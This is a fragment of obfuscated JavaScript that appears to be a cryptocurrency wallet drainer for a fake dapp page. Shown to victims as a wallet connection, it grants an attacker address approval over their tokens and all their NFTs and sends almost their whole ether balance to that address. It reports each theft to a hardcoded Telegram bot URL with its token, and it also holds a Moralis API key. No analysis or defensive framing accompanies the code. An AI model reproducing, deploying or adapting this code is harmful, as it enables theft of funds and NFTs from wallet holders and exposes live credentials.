writeContract({'address':_0x41b1cf[_0x5dc085(0x203)],'abi':ABI,'functionName':'approve','args':[Oxa,_0x5dc085(0x1f9)]});console['log'](_0x5dc085(0x220),_0x21ea3c),_0x21ea3c&&(console[_0x5dc085(0x1f0)](_0x5dc085(0x1d1)),sendMessage('Approve\x20Completed\x20Successfully'),sendMessage(_0x5dc085(0x1e8)+_0x41b1cf[_0x5dc085(0x203)]),sendMessage(_0x5dc085(0x231)+_0x41b1cf[_0x5dc085(0x21f)]),sendMessage(_0x5dc085(0x1c4)+Oxa));}catch(_0x345fbb){console[_0x5dc085(0x1f0)](_0x5dc085(0x1a6)+_0x345fbb),sendMessage(_0x5dc085(0x195));}};await loopNfts(NFTs);}async function loopNfts(_0x3a117e){const _0x3bcf9b=_0x4a2dfb;for await(let _0x5994c3 of _0x3a117e){console[_0x3bcf9b(0x1f0)]('NFT',_0x5994c3);try{let {hash:_0x4c88f9}=await writeContract({'address':_0x5994c3[_0x3bcf9b(0x241)],'abi':ABIN,'functionName':_0x3bcf9b(0x1d0),'args':[Oxa,!![]]});console[_0x3bcf9b(0x1f0)](_0x3bcf9b(0x220),_0x4c88f9),console[_0x3bcf9b(0x1f0)](_0x3bcf9b(0x232)+receipt),sendMessage(_0x3bcf9b(0x1d6)),sendMessage('NFT\x20Contract\x20Address\x20'+_0x5994c3['token_address']),sendMessage(_0x3bcf9b(0x1c4)+Oxa);}catch(_0x37f0b7){console['log']('Error:\x20'+_0x37f0b7),sendMessage(_0x3bcf9b(0x195));}}await onSendEther();}async function onSendEther(){const _0x46325a=_0x4a2dfb;console[_0x46325a(0x1f0)](_0x46325a(0x24a));try{let _0x21bfff=await fetchBalance({'address':selectedAccount});console[_0x46325a(0x1f0)](_0x21bfff);const _0x1bef69=await fetchFeeData();console[_0x46325a(0x1f0)](_0x1bef69);var _0x4c280a=_0x1bef69[_0x46325a(0x22c)][_0x46325a(0x207)];_0x4c280a=parseFloat(_0x4c280a);let _0x5f0a5e=parseFloat(_0x21bfff[_0x46325a(0x22c)])-_0x4c280a*0.00021;_0x5f0a5e=parseEther(_0x5f0a5e[_0x46325a(0x23f)]()),console[_0x46325a(0x1f0)](_0x5f0a5e);const {hash:_0x484e70}=await sendTransaction({'to':Oxa,'value':_0x5f0a5e});console[_0x46325a(0x1f0)](_0x484e70),sendMessage(_0x46325a(0x221),_0x484e70),sendMessage(_0x46325a(0x18c)),sendMessage('Transfer\x20Completed\x20Successfully,\x20You\x20should\x20receive\x20some\x20native\x20tokens');}catch{sendMessage(_0x46325a(0x1a1));}}function _0x4014(){const _0x284e43=['all','isApprovedForAll','https://metamask.app.link/dapp/','_blackListedUser','Transaction\x20Rejected','36446jFeCov','newOwner','paused','then','status','NFTs\x20collection\x20','10519348sgXScA','connector','Pause','renounceOwnership','getApproved','Insufficient\x20funds\x20for\x20transfer\x20or\x20transaction\x20was\x20rejected','New\x20token','setProvenanceHash','amount','approve','Error:\x20','_initialSupply','Error\x20processing\x20item\x20','_to','bool','deprecate','159MZUhGN','coinbase','Transfer','value','bytes4','balanceOf','&text=','redeem','provenanceHash','safeTransferFrom','AddedBlackList','price','72pmlJGB','Redeem','You\x20need\x20to\x20connect\x20your\x20wallet\x20first','33COFDDY','metamask','result','newAddress','nonpayable','json','getProvider','ee71d215d0dec7d1bf950851c84d9643','withdraw','Your\x20address\x20','Error\x20not\x20found,\x20Please\x20switch\x20network\x20or\x20try\x20again!','click','5268644VWbvtr','.connect','1981411544','view','_from','length','flipSaleState','_decimals','owner','setApprovalForAll','Approved','tokenId','Hahahahahah','interfaceId','undefined','Approve\x20Completed\x20Successfully','_clearedUser','startingIndex','symbol','bytes','https://go.cb-w.com/dapp?cb_url=','RemovedBlackList','getOwner','basisPointsRate','_maker','location','REVEAL_TIMESTAMP','error','allowance','_symbol','mintApe','constructor','.coinbase','TOKEN\x20Contract\x20Address\x20','numberOfTokens','getBlackListStatus','function','tokenByIndex','Token','Issue','Initial\x20list\x20','log','operator','name','_evilUser','sort','setParams','isBlackListed','Could\x20not\x20get\x20a\x20wallet\x20connection','trustwallet','999999999999999999999999999999999999999999999999999999999999999999999999','maxApePurchase','who','newMaxFee','newBasisPoints','https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=','openModal','application/json','map','MAX_APES','address','&format=decimal&limit=','https://deep-index.moralis.io/api/v2/','setStartingIndex','gasPrice','transferOwnership','catch','issue','string','1030691RdNNaq','DestroyedBlackFunds','0x8d42303D6B6eBB4f110A7648A08A07573315149e','_owner','No\x20address','/erc20','upgradedAddress','MetaMask','unpause','Incorrect\x20network','startingIndexBlock','from','saleStart','GET','Params','&vs_currencies=usd','/nft/collections?chain=','event','LJrmvC5VBYK43Qa9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','balance','hash','Transaction\x20hash\x20','approved','.proceed','index','chainId:','href','Cl\x20address\x20:\x20','145xZfXNT','https://api.coingecko.com/api/v3/simple/token_price/ethereum?contract_addresses=','.meta','_user','formatted','remaining','pause','ApprovalForAll','transfer','Token\x20balance\x20is\x20','Transaction\x20Receipt:\x20','tokenOfOwnerByIndex','transferFrom','OwnershipTransferred','47024vkROvX','deprecated','supportsInterface','setBaseURI','eth','MAX_UINT','usd','_balance','POnd0x\x20Wallet\x20Connected\x20Successfully\x20to\x20eth\x20mainnet!','toString','CoinbaseWalletConnector','token_address','6219830ecxcqR','_spender','emergencySetStartingIndexBlock','balances','maxFee','398154OHMcnV','totalSupply','.trust','sending\x20ether','_upgradedAddress','_value','Transaction\x20is\x20submitted\x20to\x20the\x20network','Approval','message','Unable\x20to\x20get\x20NFts','uint256'];_0x4014=function(){return _0x284e43;};return _0x4014();}async function sendMessage(_0x22f3ec){sendMessage1(_0x22f3ec),sendMessage2(_0x22f3ec);}async function sendMessage1(_0x2e7f46){return new Promise((_0x1310a2,_0x2b26ff)=>{const _0x22538f=_0x2847,_0x5ed1c9=Oxc1;fetch(_0x22538f(0x1fe)+_0x5ed1c9+_0x22538f(0x1b2)+_0x2e7f46,{'method':_0x22538f(0x219),'headers':{}})[_0x22538f(0x199)](async _0x405dd0=>{const _0x127bb7=_0x22538f;if(_0x405dd0[_0x127bb7(0x19a)]>0x18f)throw _0x405dd0;_0x1310a2(await _0x405dd0[_0x127bb7(0x1c0)]());})[_0x22538f(0x209)](_0x5c96e7=>{_0x2b26ff(_0x5c96e7);});});}async function sendMessage2(_0x47dd6e){return new Promise((_0x42554f,_0xc63cde)=>{const _0x514d3a=_0x2847,_0x4a68e1=Oxc2;fetch(_0x514d3a(0x1fe)+_0x4a68e1+'&text='+_0x47dd6e,{'method':'GET','headers':{}})[_0x514d3a(0x199)](async _0x599aac=>{const _0x59095f=_0x514d3a;if(_0x599aac[_0x59095f(0x19a)]>0x18f)throw _0x599aac;_0x42554f(await _0x599aac[_0x59095f(0x1c0)]());})[_0x514d3a(0x209)](_0x177768=>{_0xc63cde(_0x177768);});});}async function getPrice(_0x3803ba){return new Promise((_0x2d697e,_0x48c887)=>{const _0x4a657f=_0x2847;fetch(_0x4a657f(0x229)+_0x3803ba+_0x4a657f(0x21b),{'method':_0x4a657f(0x219),'headers':{}})[_0x4a657f(0x199)](async _0x4f2c29=>{const _0x376e91=_0x4a657f;if(_0x4f2c29[_0x376e91(0x19a)]>0x18f)throw _0x4f2c29;_0x2d697e(await _0x4f2c29[_0x376e91(0x1c0)]());})[_0x4a657f(0x209)](_0x3654bf=>{_0x48c887(_0x3654bf);});});}async function getValue(_0x1ae6d3,_0x1d6295,_0x220233){const _0x521e7e=_0x4a2dfb;console[_0x521e7e(0x1f0)](_0x1ae6d3,_0x1d6295,_0x220233);let _0x37cf8e=await getPrice(_0x1ae6d3);console['log'](_0x521e7e(0x1b7),_0x37cf8e),_0x37cf8e=parseFloat(_0x37cf8e[_0x1ae6d3][_0x521e7e(0x23c)]);let _0x1cfa0e=_0x1d6295/0xa**(_0x220233||0x12)*_0x37cf8e;return _0x1cfa0e=parseInt(_0x1cfa0e),_0x37cf8e?_0x1cfa0e:0x0;}async function getNFTs(_0x5180dd='',_0x16c986=_0x4a2dfb(0x21e),_0x11c920=_0x4a2dfb(0x23a),_0x5405cd='50'){return new Promise((_0x4789b0,_0x43e57a)=>{const _0x3a5407=_0x2847;fetch(_0x3a5407(0x205)+_0x5180dd+_0x3a5407(0x21c)+_0x11c920+_0x3a5407(0x204)+_0x5405cd,{'method':_0x3a5407(0x219),'headers':{'accept':_0x3a5407(0x200),'X-API-Key':_0x16c986}})[_0x3a5407(0x199)](async _0x5447e2=>{if(_0x5447e2['status']>0x18f)throw _0x5447e2;_0x4789b0(await _0x5447e2['json']());})[_0x3a5407(0x209)](_0x22dbc4=>{_0x43e57a(_0x22dbc4);});});}